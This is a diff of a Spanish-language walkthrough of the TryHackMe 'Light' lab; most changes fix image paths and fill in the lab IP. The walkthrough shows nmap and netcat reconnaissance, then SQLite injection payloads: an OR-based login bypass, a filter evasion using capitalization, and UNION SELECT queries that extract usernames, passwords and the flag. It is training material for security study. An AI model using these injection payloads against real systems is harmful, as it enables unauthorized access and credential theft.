@@ -17,13 +17,13 @@ Writeup / walkthrough de la máquina **Light** de TryHackMe. El desafío consist
 ### Escaneo inicial de puertos abiertos
 
 ```bash
-nmap -p- -Pn -T4 <IP>
+nmap -p- -Pn -T4 <10.66.183.195>
 ```
 
 ### Escaneo de versiones sobre los puertos encontrados
 
 ```bash
-nmap -sCV -p 22,1337 <IP>
+nmap -sCV -p 22,1337 <10.66.183.195>
 ```
 
 El escaneo reveló dos puertos abiertos: **22 (SSH)** y **1337**, este último correspondiente a una aplicación personalizada.
@@ -35,7 +35,7 @@ El escaneo reveló dos puertos abiertos: **22 (SSH)** y **1337**, este último c
 La máquina indica que hay una aplicación de base de datos llamada **Light** corriendo en el puerto 1337, accesible vía `netcat`, y sugiere el usuario `smokey` para iniciar sesión:
 
 ```bash
-nc <IP> 1337
+nc <10.66.183.195> 1337
 ```
 
 ![Conexión inicial vía netcat](images/01.png)
@@ -48,7 +48,7 @@ Al conectarnos con el usuario `smokey`, la aplicación devuelve una contraseña 
 
 Dado que el puerto 22 estaba abierto, se probó reutilizar la contraseña obtenida para autenticarse por SSH con el usuario `smokey`. Las credenciales **no funcionaron**.
 
-![Intento fallido de login SSH](screenshots/02.png)
+![Intento fallido de login SSH](images/02.png)
 
 ---
 
@@ -56,7 +56,7 @@ Dado que el puerto 22 estaba abierto, se probó reutilizar la contraseña obteni
 
 Se probó introducir una comilla simple (`'`) en el campo de usuario para comprobar si la entrada se procesaba directamente en una consulta SQL:
 
-![Prueba de comilla simple](screenshots/03.png)
+![Prueba de comilla simple](images/03.png)
 
 La aplicación devolvió un error, lo que confirma que el input **no está siendo saneado** y se concatena directamente en la consulta.
 
@@ -66,11 +66,11 @@ La aplicación devolvió un error, lo que confirma que el input **no está siend
 smokey 'OR'1'='1
 ```
 
-![Bypass de autenticación con OR 1=1](screenshots/04.png)
+![Bypass de autenticación con OR 1=1](images/04.png)
 
 Aunque la inyección altera el comportamiento de la consulta, la contraseña resultante tampoco permitió el acceso por SSH.
 
-![Segundo intento de conexión SSH fallido](screenshots/05.png)
+![Segundo intento de conexión SSH fallido](images/05.png)
 
 ---
 
@@ -86,7 +86,7 @@ La aplicación respondió con un mensaje de filtrado de palabras:
 "ahh there is a Word in there I don't like :("
 ```
 
-![Filtro de palabras detectado](screenshots/06.png)
+![Filtro de palabras detectado](images/06.png)
 
 ### Bypass del filtro por capitalización
 
@@ -96,17 +96,17 @@ Se reescribió la consulta variando la capitalización de las palabras clave, co
 smokey 'Union'
 ```
 
-![Prueba con Union capitalizado](screenshots/07.png)
+![Prueba con Union capitalizado](images/07.png)
 
 ```
 smokey 'Select'
 ```
 
-![Prueba con Select filtrado](screenshots/08.png)
+![Prueba con Select filtrado](images/08.png)
 
 Al variar únicamente una letra en mayúscula, la aplicación devolvió una respuesta vacía en lugar de un error, indicando que la consulta se ejecutó correctamente pero sin resultados visibles:
 
-![Respuesta vacía tras bypass de filtro](screenshots/09.png)
+![Respuesta vacía tras bypass de filtro](images/09.png)
 
 ---
 
@@ -118,7 +118,7 @@ Al variar únicamente una letra en mayúscula, la aplicación devolvió una resp
 smokey 'Union Select name from sqlite_master'
 ```
 
-![Nombre de tabla obtenido](screenshots/10.png)
+![Nombre de tabla obtenido](images/10.png)
 
 ### Obtener el esquema de la tabla
 
@@ -126,7 +126,7 @@ smokey 'Union Select name from sqlite_master'
 smokey 'Union select sql from sqlite_master'
 ```
 
-![Estructura de la tabla admintable](screenshots/11.png)
+![Estructura de la tabla admintable](images/11.png)
 
 Se identifican las columnas: **`id`**, **`username`**, **`password`**.
 
@@ -136,7 +136,7 @@ Se identifican las columnas: **`id`**, **`username`**, **`password`**.
 smokey 'Union Select * from admintable'
 ```
 
-![Error al extraer todos los registros](screenshots/12.png)
+![Error al extraer todos los registros](images/12.png)
 
 ### Conteo de registros
 
@@ -144,7 +144,7 @@ smokey 'Union Select * from admintable'
 smokey 'Union Select count(id) from admintable'
 ```
 
-![Conteo de registros: 2 usuarios](screenshots/13.png)
+![Conteo de registros: 2 usuarios](images/13.png)
 
 Resultado: **2 registros**, es decir, dos usuarios en la tabla.
 
@@ -158,7 +158,7 @@ Resultado: **2 registros**, es decir, dos usuarios en la tabla.
 smokey 'Union Select username from admintable'
 ```
 
-![Usuario TryHackMeAdmin obtenido](screenshots/14.png)
+![Usuario TryHackMeAdmin obtenido](images/14.png)
 
 ➡️ Usuario obtenido: **`TryHackMeAdmin`**
 
@@ -168,7 +168,7 @@ smokey 'Union Select username from admintable'
 smokey 'Union Select username from admintable where username != TryHackMeAdmin'
 ```
 
-![Segundo usuario: flag](screenshots/15.png)
+![Segundo usuario: flag](images/15.png)
 
 ➡️ Usuario obtenido: **`flag`**
 
@@ -178,7 +178,7 @@ smokey 'Union Select username from admintable where username != TryHackMeAdmin'
 smokey 'Union Select password from admintable where username != TryHackMeAdmin'
 ```
 
-![Flag del laboratorio obtenida](screenshots/16.png)
+![Flag del laboratorio obtenida](images/16.png)
 
 ✅ Con este valor se obtiene la **flag** del laboratorio.
 
@@ -188,7 +188,7 @@ smokey 'Union Select password from admintable where username != TryHackMeAdmin'
 smokey 'Union Select password from admintable where username = TryHackMeAdmin'
 ```
 
-![Contraseña de TryHackMeAdmin](screenshots/17.png)
+![Contraseña de TryHackMeAdmin](images/17.png)
 
 Con esto se responde también la segunda pregunta del laboratorio.
 
